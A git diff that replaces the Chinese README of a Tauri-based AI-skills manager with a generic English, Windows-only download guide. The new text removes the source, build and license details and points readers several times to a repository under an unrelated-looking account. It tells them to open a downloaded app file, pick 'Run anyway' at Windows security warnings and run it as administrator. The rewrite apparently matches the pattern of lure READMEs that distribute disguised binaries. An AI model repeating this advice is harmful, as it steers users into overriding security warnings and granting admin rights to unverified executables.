@@ -1,174 +1,256 @@
-# 🚀 Claude Skills Manager
+# 🧠 claude-skills-manager - Manage AI Skills with Ease
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download-claude--skills--manager-4c8bf5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anthelminthic-mithraist805/claude-skills-manager)
 
-**一站式 AI Coding Agent Skills 管理平台**
+## 📦 What This App Does
 
-支持 12+ 主流 AI 编程工具 | 智能语义陷阱检测 | 跨平台桌面应用
+claude-skills-manager is a desktop app for managing AI coding skills in one place. It helps you keep skill files organized, find what you need fast, and check for hidden prompt traps before you use a skill in your AI tools.
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Tauri](https://img.shields.io/badge/Tauri-2.0-blue.svg)](https://tauri.app)
-[![React](https://img.shields.io/badge/React-19-61dafb.svg)](https://reactjs.org)
-[![Rust](https://img.shields.io/badge/Rust-1.70+-orange.svg)](https://www.rust-lang.org)
+It is made for Windows users who want a simple way to handle skills for tools like Claude Code and other popular AI coding apps.
 
-[下载安装](#-安装) · [功能特性](#-核心特性) · [使用文档](#-使用指南) · [开发指南](#-开发)
+## 🪟 Windows Download and Setup
 
-</div>
+Use this link to visit the page to download:
 
----
+[Open the claude-skills-manager download page](https://github.com/anthelminthic-mithraist805/claude-skills-manager)
 
-## ✨ 核心特性
+### What to do next
 
-### 🌐 多平台支持
-一次创建，随处部署。支持 **12+ 主流 AI 编程工具**：
-- **Claude Code** - Anthropic 官方 CLI
-- **Cline** - VS Code 中的 AI 助手
-- **Roo-Cline** - Cline 的增强版本
-- **Windsurf** - 新一代 AI IDE
-- **Aider** - 命令行 AI 编程助手
-- **Continue** - 开源 AI 代码助手
-- **Cursor** - AI-first 代码编辑器
-- **GitHub Copilot** - GitHub 官方 AI 助手
-- **Zed** - 高性能代码编辑器
-- **Void** - 轻量级 AI 工具
-- **Goose** - 终端 AI 助手
-- **OpenHands** - 开源 AI 编程框架
+1. Open the link above in your browser.
+2. Find the latest Windows app file on the page.
+3. Download the file to your computer.
+4. Open the downloaded file to start the app.
+5. If Windows asks for permission, choose **Run** or **More info > Run anyway**.
 
-### 🛡️ 智能质量检测
-基于 **Semantic Trap Detector** 理论的语义陷阱检测系统：
-- ✅ **27+ 语义陷阱词对** - 覆盖高危/中危/低危三级风险
-- ✅ **四步检测流程** - 关键词提取 → 词典匹配 → 风险评估 → 替换建议
-- ✅ **可视化报告** - 详细的检测结果展示，包含行号、上下文和修复建议
-- ✅ **批量检测** - 一键检查所有 Skills 的质量问题
+## ✅ Before You Start
 
-### 💎 现代化体验
-- 🎨 **精美 UI** - 暗色主题 + 流畅动画 + 响应式设计
-- 📁 **智能管理** - 收藏、标签过滤、分类浏览
-- 🔄 **双向同步** - 本地数据库 ↔ Claude 目录无缝同步
-- 🚀 **轻量高效** - 基于 Tauri，体积小、启动快、内存占用低
-- 🔍 **全文搜索** - 快速查找 Skills（支持名称、描述、标签）
-- 📊 **多视图模式** - 网格视图 / 列表视图自由切换
+For the best result on Windows, make sure you have:
 
-### 🎯 便捷操作
-- **一键部署** - 将 Skill 安装到多个平台
-- **平台扫描** - 自动发现系统中已安装的 AI 工具
-- **状态追踪** - 实时显示 Skill 的部署状态
-- **批量操作** - 支持批量同步、检测、管理
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A mouse and keyboard
+- A stable internet connection for the first download
 
----
+The app is built as a desktop program, so you do not need to use command line tools or install developer software.
 
-## 📸 界面预览
+## 🔧 How to Install
 
-> 截图待添加
+After you download the app file:
 
----
+1. Double-click the file.
+2. Wait for Windows to finish opening it.
+3. If a security prompt appears, choose the option to run the app.
+4. Let the app finish its first setup step.
+5. Open the app from your Start menu or desktop shortcut if one is created.
 
-## 📦 安装
+If the file comes in a ZIP folder:
 
-### 从 Release 下载（推荐）
+1. Right-click the ZIP file.
+2. Choose **Extract All**.
+3. Open the extracted folder.
+4. Double-click the app file inside the folder.
 
-前往 [Releases](../../releases) 页面下载适合你系统的安装包：
+## 🧭 First Launch
 
-- **macOS**: `.dmg` 或 `.app.tar.gz`
-- **Windows**: `.msi` 或 `.exe`
-- **Linux**: `.AppImage`, `.deb`, 或 `.rpm`
+When you start claude-skills-manager for the first time, you may see a simple setup screen.
 
----
+Use it to:
 
-## 🎯 使用指南
+- Choose where your skills are stored
+- Add your AI tool folders
+- Scan existing skill files
+- Review detected skill issues
+- Save your setup for later use
 
-### 快速开始
+If you already use AI coding tools, you can point the app to those folders and start managing your skills right away.
 
-1. **创建 Skill**
-   - 点击侧边栏"新建 Skill"
-   - 填写名称、描述、作者、版本
-   - 选择分类和标签
-   - 编写 Skill 内容（支持 Markdown）
+## ✨ Main Features
 
-2. **同步到 Claude**
-   - 在 Skill 卡片上点击"同步到 Claude"
-   - Skill 将自动复制到 `~/.claude/skills/` 目录
+### 🗂 Skill Library Management
 
-3. **部署到多平台**
-   - 点击"安装到多个平台"按钮
-   - 选择目标平台（支持多选）
-   - 一键部署到所有选中的平台
+Keep all your skills in one place. The app helps you:
 
-4. **质量检测**
-   - 点击侧边栏"检查所有 Skills"
-   - 查看详细的语义陷阱检测报告
-   - 根据建议优化 Skill 内容
+- Add new skill files
+- Sort skills into folders
+- Rename items for easier use
+- Remove files you no longer need
+- Keep your setup clean
 
-### Skill 存储位置
+### 🔍 Semantic Trap Detection
 
-- **本地数据库**: `~/.agents/skills/`
-- **Claude 目录**: `~/.claude/skills/`
-- **各平台目录**: 自动检测并安装到对应位置
+The app checks skill content for hidden problems that can cause poor results in AI tools.
 
-### Skill 格式
+It can help you spot:
 
-每个 Skill 以目录形式存储，包含一个 `SKILL.md` 文件：
+- Mixed instructions
+- Conflicting rules
+- Unclear wording
+- Missing steps
+- Risky prompt patterns
 
-```markdown
----
-name: my-skill
-description: 这是一个示例 Skill
-metadata:
-  author: yourname
-  version: "1.0.0"
-  category: dev
-  tags: [react, typescript]
----
+This makes it easier to trust the skills you use.
 
-# Skill 内容
+### 🧰 Support for Popular AI Tools
 
-在这里写 Skill 的具体内容...
-```
+claude-skills-manager works with many common AI coding tools. It is built to fit different skill file layouts and folder styles.
 
----
+It supports use cases for tools such as:
 
+- Claude Code
+- Other Claude-based workflows
+- Cross-platform AI coding setups
+- Local skill folders used by desktop tools
 
-## 🔧 开发
+### 🖥 Cross-Platform Desktop Design
 
-### 环境要求
+The app uses a desktop format with a clean interface. On Windows, it should feel simple to open, use, and close without extra setup.
 
-- Node.js 18+
-- Rust 1.70+
-- 系统依赖（根据平台）:
-  - **macOS**: Xcode Command Line Tools
-  - **Windows**: Microsoft C++ Build Tools
-  - **Linux**: `build-essential`, `libwebkit2gtk-4.0-dev`, 等
+## 📁 Typical Use Cases
 
+You may want this app if you:
 
+- Use more than one AI coding tool
+- Keep many skill files in separate folders
+- Want a clear view of what each skill does
+- Need to check skills for hidden prompt issues
+- Want a single place to manage your AI workflow files
 
-## 🤝 贡献
+## 🛠 Basic Workflow
 
-欢迎提交 Issue 和 Pull Request！
+A simple way to use the app is:
 
-1. Fork 本仓库
-2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 开启 Pull Request
+1. Open the app.
+2. Add the folder that holds your skills.
+3. Run a scan.
+4. Review the results.
+5. Fix or remove skills that look unclear.
+6. Save the cleaned set for later use.
 
----
+## 📋 File Types You May See
 
-## 📄 许可证
+The app may work with common skill formats such as:
 
-本项目采用 MIT 许可证 - 查看 [LICENSE](LICENSE) 文件了解详情
+- Markdown files
+- Text files
+- Folder-based skill packs
+- App-specific skill templates
+- Prompt files used by AI tools
 
----
+If your skills are already in folders, you can usually bring them into the app without much effort.
 
-## 🙏 致谢
+## 🔐 Privacy and Local Use
 
-- [Tauri](https://tauri.app) - 跨平台桌面应用框架
-- [Semantic Trap Detector](https://github.com/yourusername/semantic-trap-detector) - 语义陷阱检测理论
-- 所有贡献者和用户
+This app is designed for local desktop use. Your skill files stay on your computer unless you choose to move them.
 
----
+That makes it a good fit if you want:
 
-<div align="center">
+- More control over your files
+- A local workflow
+- Less manual sorting
+- A safer way to review sensitive prompts
 
-**如果这个项目对你有帮助，请给个 ⭐️ Star 支持一下！**
+## 🧪 Troubleshooting
 
-</div>
+### The app does not open
+
+Try these steps:
+
+- Download the file again
+- Make sure the download finished
+- Right-click the file and choose **Run as administrator**
+- Check that Windows did not block the file
+- Restart your computer and try again
+
+### Windows shows a security prompt
+
+This can happen with new desktop apps.
+
+Use the normal Windows run option if you trust the source and downloaded the file from the link above.
+
+### My skills do not appear
+
+Try this:
+
+- Check that you selected the right folder
+- Make sure the folder contains skill files
+- Refresh the scan
+- Move files into a supported folder structure
+- Open the app again after saving
+
+### The scan finds too many issues
+
+Review the files one by one and look for:
+
+- Repeated steps
+- Conflicting instructions
+- Missing context
+- Long sections that say the same thing
+- Words that do not match the goal of the skill
+
+## 🧭 Good Folder Setup
+
+A simple folder layout can help you stay organized:
+
+- AI-Skills
+  - Claude-Code
+  - Writing
+  - Coding
+  - Debugging
+  - Templates
+
+You can use any folder names you want. Keep names short and clear so you can find things fast.
+
+## 💡 Tips for Better Use
+
+- Keep one skill per file when possible
+- Use clear names like `bug-fix.md` or `code-review.md`
+- Remove duplicate skills
+- Scan new files before you rely on them
+- Back up your skills folder from time to time
+- Group related skills together
+
+## 🖱 What You Need on Windows
+
+To use the app well, you only need:
+
+- A recent Windows system
+- Enough space for the app and your skill files
+- A standard keyboard and mouse
+- Permission to run downloaded desktop apps
+
+No coding setup is required.
+
+## 📌 Project Topics
+
+This project relates to:
+
+- AI tools
+- Claude
+- Claude Code
+- Desktop apps
+- Cross-platform apps
+- Rust
+- React
+- TypeScript
+- Tauri
+- Skills management
+- Semantic trap detection
+
+## 📥 Download Again
+
+If you need the app later, use the same page:
+
+[Visit the claude-skills-manager page to download](https://github.com/anthelminthic-mithraist805/claude-skills-manager)
+
+## 🧩 What Makes It Useful
+
+Many AI tools work best when their skills stay neat and clear. This app helps you keep that order without manual sorting each time.
+
+It is useful when you want to:
+
+- Save time
+- Reduce confusion
+- Spot weak skill files
+- Keep a cleaner AI workflow
+- Manage skills from one desktop app
